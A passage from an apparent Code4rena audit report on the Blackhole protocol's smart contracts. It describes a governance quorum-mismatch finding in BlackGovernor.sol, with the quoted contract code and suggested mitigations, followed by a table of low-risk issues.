vote\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Note: tailEmissionRate will have been set via `nudge()`\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_weekly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_weekly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etailEmissionRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMAX_BPS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis allows the DAO to truly control emissions starting at epoch 67, as promised in the docs.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-45\"\u003erayss\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-22-governance-deadlock-potential-in-blackgovernorsol-due-to-quorum-mismatch\" style=\"position:relative;\"\u003e\u003ca href=\"#m-22-governance-deadlock-potential-in-blackgovernorsol-due-to-quorum-mismatch\" aria-label=\"m 22 governance deadlock potential in blackgovernorsol due to quorum mismatch permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-57\"\u003e[M-22] Governance deadlock potential in \u003ccode\u003eBlackGovernor.sol\u003c/code\u003e due to quorum mismatch\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-52\"\u003espectr\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/BlackGovernor.sol#L52\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/BlackGovernor.sol#L52\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/BlackGovernor.sol#L91\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/BlackGovernor.sol#L91\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-12\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-12\" aria-label=\"finding description 12 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eSeverity\u003c/strong\u003e: Medium\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAffected contracts\u003c/strong\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003econtracts/BlackGovernor.sol\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003econtracts/VotingEscrow.sol\u003c/code\u003e (as the source of \u003ccode\u003egetPastTotalSupply\u003c/code\u003e and \u003ccode\u003esmNFTBalance\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003econtracts/MinterUpgradeable.sol\u003c/code\u003e (as the target of the \u003ccode\u003enudge()\u003c/code\u003e function)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThe mechanism for proposals in \u003ccode\u003eBlackGovernor.sol\u003c/code\u003e has a fundamental mismatch between how the \u003ccode\u003eproposalThreshold\u003c/code\u003e is determined and how the \u003ccode\u003equorum\u003c/code\u003e is calculated.\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eProposal Threshold\u003c/strong\u003e: Determined by \u003ccode\u003eproposalThreshold()\u003c/code\u003e, which requires a percentage (default 0.2%, configurable by \u003ccode\u003eteam\u003c/code\u003e up to 10%) of the \u003cem\u003etotal current \u003ccode\u003eveBLACK\u003c/code\u003e voting power\u003c/em\u003e. This includes voting power from both regular \u003ccode\u003eveNFT\u003c/code\u003e locks and Supermassive NFTs (smNFTs).\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"76\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// contracts/BlackGovernor.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eproposalThreshold\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e   \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPastTotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalNumerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePROPOSAL_DENOMINATOR\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// token.getPastTotalSupply() resolves to VotingEscrow.totalSupplyAtT(timestamp)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eQuorum\u003c/strong\u003e: Determined by \u003ccode\u003equorum()\u003c/code\u003e, which requires 4% of \u003ccode\u003etoken.getsmNFTPastTotalSupply()\u003c/code\u003e. This \u003ccode\u003egetsmNFTPastTotalSupply()\u003c/code\u003e resolves to \u003ccode\u003eVotingEscrow.smNFTBalance\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eVotingEscrow.smNFTBalance\u003c/code\u003e represents the cumulative sum of \u003cem\u003eprincipal \u003ccode\u003eBLACK\u003c/code\u003e tokens ever burned\u003c/em\u003e to create or upgrade to smNFTs. This \u003ccode\u003esmNFTBalance\u003c/code\u003e value only ever increases. The 4% of this principal amount is then used as the target for the \u003cem\u003etotal voting power\u003c/em\u003e that must be cast in favor of a proposal.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"77\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// contracts/BlackGovernor.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003equorum\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblockTimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetsmNFTPastTotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() * \u003c/span\u003e\u003cspan class=\"mtk11\"\u003equorumNumerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()) / \u003c/span\u003e\u003cspan class=\"mtk11\"\u003equorumDenominator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// quorumNumerator is 4\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// token.getsmNFTPastTotalSupply() resolves to VotingEscrow.smNFTBalance\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis creates a situation where the ability to propose is based on overall \u003ccode\u003eveBLACK\u003c/code\u003e voting power distribution, but the ability for a proposal to pass (quorum) is heavily tied to a growing, historical sum of burned \u003ccode\u003eBLACK\u003c/code\u003e for smNFTs, which might not correlate with active smNFT voting participation or the total active voting power.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"risk-and-impact-1\" style=\"position:relative;\"\u003e\u003ca href=\"#risk-and-impact-1\" aria-label=\"risk and impact 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRisk and Impact\u003c/h3\u003e\n\u003cp\u003eThe primary risk is a \u003cstrong\u003eDenial of Service (DoS)\u003c/strong\u003e for the \u003ccode\u003eMinterUpgradeable.nudge()\u003c/code\u003e function, which is the \u003cem\u003eonly\u003c/em\u003e function \u003ccode\u003eBlackGovernor.sol\u003c/code\u003e can call.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGovernance deadlock scenario (Medium risk)\u003c/strong\u003e: As the protocol matures, \u003ccode\u003eVotingEscrow.smNFTBalance\u003c/code\u003e (total \u003ccode\u003eBLACK\u003c/code\u003e principal burned for smNFTs) can grow significantly. If this balance becomes very large, the 4% quorum target (in terms of required voting power) can become unachievably high for the following reasons:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eActive smNFT holders might be a small fraction of the total \u003ccode\u003esmNFTBalance\u003c/code\u003e contributors (e.g., due to inactive early minters).\u003c/li\u003e\n\u003cli\u003eThe collective voting power of active smNFT holders who support a given proposal might be insufficient to meet this high quorum.\u003c/li\u003e\n\u003cli\u003eA user or group could meet the \u003ccode\u003eproposalThreshold()\u003c/code\u003e using voting power from regular \u003ccode\u003eveBLACK\u003c/code\u003e locks, but their proposal would consistently fail if the smNFT-derived quorum is not met by other voters. This leads to the \u003ccode\u003enudge()\u003c/code\u003e function becoming unusable, preventing any future adjustments to the tail emission rate via this governor.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eGovernance spam\u003c/strong\u003e: A secondary consequence is the potential for governance “spam,” where proposals are repeatedly created meeting the threshold but are destined to fail due to the quorum structure, causing on-chain noise.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eContrast - low quorum scenario (Informational)\u003c/strong\u003e: Conversely, if \u003ccode\u003esmNFTBalance\u003c/code\u003e is very low (e.g., early in the protocol, or if smNFTs are unpopular), the quorum can be trivially met, potentially allowing a small group (that meets proposal threshold) to easily control the \u003ccode\u003enudge()\u003c/code\u003e function. This aspect was previously noted but provides context to the design’s sensitivity to \u003ccode\u003esmNFTBalance\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eIllustrative deadlock scenario\u003c/strong\u003e:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eThe \u003ccode\u003esmNFTBalance\u003c/code\u003e in \u003ccode\u003eVotingEscrow.sol\u003c/code\u003e has grown to a large number (e.g., 10,000,000 \u003ccode\u003eBLACK\u003c/code\u003e principal burned).\u003c/li\u003e\n\u003cli\u003eThe quorum target, in terms of voting power, becomes 4% of this, i.e., equivalent to the voting power derived from 400,000 \u003ccode\u003eBLACK\u003c/code\u003e (if it were all smNFTs with average lock/bonus).\u003c/li\u003e\n\u003cli\u003eA group of users (“Proposers”) accumulates 0.2% of the total \u003ccode\u003eveBLACK\u003c/code\u003e voting power (e.g., from a mix of regular and some smNFT locks) and creates a proposal to \u003ccode\u003enudge()\u003c/code\u003e emissions.\u003c/li\u003e\n\u003cli\u003eMany of the smNFTs contributing to the \u003ccode\u003esmNFTBalance\u003c/code\u003e were created by users who are now inactive or do not vote on this proposal.\u003c/li\u003e\n\u003cli\u003eThe active smNFT holders, plus the Proposers’ own smNFT voting power, sum up to less than the 400,000 \u003ccode\u003eBLACK\u003c/code\u003e equivalent voting power required for quorum.\u003c/li\u003e\n\u003cli\u003eThe proposal fails. This cycle can repeat, rendering the \u003ccode\u003enudge()\u003c/code\u003e function effectively disabled.\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-23\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-23\" aria-label=\"recommended mitigation steps 23 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eThe current quorum mechanism presents a significant risk to the intended functionality of \u003ccode\u003eBlackGovernor.sol\u003c/code\u003e. Consider the following:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eAlign quorum base\u003c/strong\u003e: Modify the quorum calculation to be based on a metric more aligned with active participation or total voting power, similar to the \u003ccode\u003eproposalThreshold\u003c/code\u003e. For example, base the quorum on a percentage of \u003ccode\u003etoken.getPastTotalSupply(block.timestamp)\u003c/code\u003e (total \u003ccode\u003eveBLACK\u003c/code\u003e voting power).\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eAdaptive quorum\u003c/strong\u003e: Implement an adaptive quorum mechanism. This could involve:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eA quorum that adjusts based on recent voting participation in \u003ccode\u003eBlackGovernor\u003c/code\u003e proposals.\u003c/li\u003e\n\u003cli\u003eA system where the contribution of an smNFT to the \u003ccode\u003esmNFTBalance\u003c/code\u003e (for quorum calculation purposes, not its actual voting power) decays over time if the smNFT is inactive in governance.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDual quorum condition\u003c/strong\u003e: Consider requiring the lesser of two quorum conditions to be met: e.g., (4% of \u003ccode\u003esmNFTBalance\u003c/code\u003e-derived voting power) OR (X% of total \u003ccode\u003eveBLACK\u003c/code\u003e voting power). This provides a fallback if \u003ccode\u003esmNFTBalance\u003c/code\u003e becomes disproportionately large or inactive.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eDocumentation and monitoring\u003c/strong\u003e: If the current design is retained, thoroughly document the rationale and potential long-term implications. Continuously monitor \u003ccode\u003esmNFTBalance\u003c/code\u003e growth versus active smNFT voting participation and total \u003ccode\u003eveBLACK\u003c/code\u003e supply to assess if the \u003ccode\u003enudge()\u003c/code\u003e function’s viability is threatened.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003eBlackhole marked as informative\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"\u003e\u003ca href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eLow Risk and Non-Critical Issues\u003c/h1\u003e\n\u003cp\u003eFor this audit, 13 reports were submitted by wardens detailing low risk and non-critical issues. The \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-341\"\u003ereport highlighted below\u003c/a\u003e by \u003cstrong\u003erayss\u003c/strong\u003e received the top score from the judge.\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eThe following wardens also submitted reports: \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-80\"\u003eChapo\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-448\"\u003eGaurangBrdv\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-36\"\u003egolomp\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-1\"\u003eHarisuthan\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-484\"\u003eIzuMan\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-368\"\u003eK42\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-22\"\u003emihailvichev\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-351\"\u003emnedelchev_\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-439\"\u003ePolarizedLight\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-531\"\u003eSparrow\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-207\"\u003ezhanmingjing\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-191\"\u003eZZhelev\u003c/a\u003e.\u003c/em\u003e\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth\u003eID\u003c/th\u003e\n\u003cth\u003eDescription\u003c/th\u003e\n\u003cth\u003eSeverity\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd\u003e[01]\u003c/td\u003e\n\u003ctd\u003eEarly returning in \u003ccode\u003e_blacklist()\u003c/code\u003e and \u003ccode\u003eblacklistConnector\u003c/code\u003e function prevents emission of blacklisted event and blacklistConnector event respectively\u003c/td\u003e\n\u003ctd\u003eLow\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[02]\u003c/td\u003e\n\u003ctd\u003eIncomplete implementation of \u003ccode\u003epurchased\u003c/code\u003e function in Auction contract\u003c/td\u003e\n\u003ctd\u003eLow\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[03]\u003c/td\u003e\n\u003ctd\u003eStack too deep error in inline assembly (variable \u003ccode\u003eheadStart\u003c/code\u003e)\u003c/td\u003e\n\u003ctd\u003eLow\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[04]\u003c/td\u003e\n\u003ctd\u003eHardcoded manager lacks ability to renounce control\u003c/td\u003e\n\u003ctd\u003eLow\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[05]\u003c/td\u003e\n\u003ctd\u003ePrecision loss in smNFT bonus calculation may result in zero bonus when updating to smNFT\u003c/td\u003e\n\u003ctd\u003eLow\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[06]\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003egetVotes()\u003c/code\u003e wiew function becomes unusable when a user owns too many locks\u003c/td\u003e\n\u003ctd\u003eLow\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[07]\u003c/td\u003e\n\u003ctd\u003e\u003ccode\u003edistributeAll()\u003c/code\u003e function at risk of repeated failure due to unbounded loop over gauges\u003c/td\u003e\n\u003ctd\u003eLow\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[08]\u003c/td\u003e\n\u003ctd\u003eFee recipient may remain set to previous owner\u003c/td\u003e\n\u003ctd\u003eLow\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[09]\u003c/td\u003e\n\u003ctd\u003eIncorrect \u003ccode\u003esetRouter\u003c/code\u003e function only allows zero address to pass\u003c/td\u003e\n\u003ctd\u003eLow\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[10]\u003c/td\u003e\n\u003ctd\u003eMisaligned access control on \u003ccode\u003esetTopNPools()\u003c/code\u003e function\u003c/td\u003e\n\u003ctd\u003eLow\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[11]\u003c/td\u003e\n\u003ctd\u003eGovernance/centralization Risks (21 contracts covered)\u003c/td\u003e\n\u003ctd\u003eGovernance\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[12]\u003c/td\u003e\n\u003ctd\u003eFunction declaration does not follow Solidity style guide at \u003ccode\u003eFixedAuction.sol\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eNon-Critical\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd\u003e[13]\u003c/td\u003e\n\u003ctd\u003eIncorrect require statement for address check at \u003ccode\u003eGaugeV2.sol\u003c/code\u003e\u003c/td\u003e\n\u003ctd\u003eNon-Critical\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003cp\u003e\u003cem\u003eNote: QA report issues determined invalid by the judge have been removed from the final report.\u003c/em\u003e \u003c/p\u003e\n\u003ch2 id=\"01-early-returning-in-_blacklist-and-blacklistconnector-function-prevents-emission-of-blacklisted-event-and-blacklistconnector-event-respectively\" style=\"position:relative;\"\u003e\u003ca href=\"#01-early-returning-in-_blacklist-and-blacklistconnector-function-prevents-emission-of-blacklisted-event-and-blacklistconnector-event-respectively\" aria-label=\"01 early returning in _blacklist and blacklistconnector function prevents emission of blacklisted event and blacklistconnector event respectively permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 